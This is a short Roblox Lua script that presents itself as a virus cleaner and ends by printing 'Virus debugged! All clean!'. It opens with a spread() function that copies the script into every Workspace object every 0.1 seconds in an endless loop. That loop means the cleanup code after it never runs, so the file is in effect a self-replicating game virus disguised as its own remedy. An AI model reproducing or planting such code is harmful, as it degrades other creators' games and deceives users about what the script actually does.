function spread() -- created by deathbylamas
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do
if (stuff[i].className ~= "Script") and (stuff[i]:findFirstChild("Vaccine") == nil) and (stuff[i].className ~= "Camera") then
local clone = script:clone()
clone.Parent = stuff[i]
end
end
end

while true do
wait(.1)
spread()
end

function GetAllItems(mdl) 
local objs = {} 
function Search(obj) 
if obj~=workspace then 
table.insert(objs,obj) 
end 
if #obj:GetChildren() > 0 then 
for i, v in ipairs(obj:GetChildren()) do 
Search(v) 
end 
end 
end 
Search(mdl) 
return objs 
end 



for i, v in ipairs(GetAllItems(workspace)) do 
if v.className == "Script" then 
if v.Name == "Chaotic" or v.Name == "Spreadify" or v.Name == "Virus" or v.Name == "Infected" then 
v.Parent = game.Lighting --Just in case it has a removal prevention. 
t = Instance.new("ObjectValue") 
t.Name = "IsAVirus" 
t.Parent = v 
end 
end 
end 

for i, v in ipairs(game.Lighting:GetChildren()) do 
if v:findFirstChild("IsAVirus") then --Only remove the viruses. 
v:remove() 
end 
end 


print("Virus debugged! All clean!")
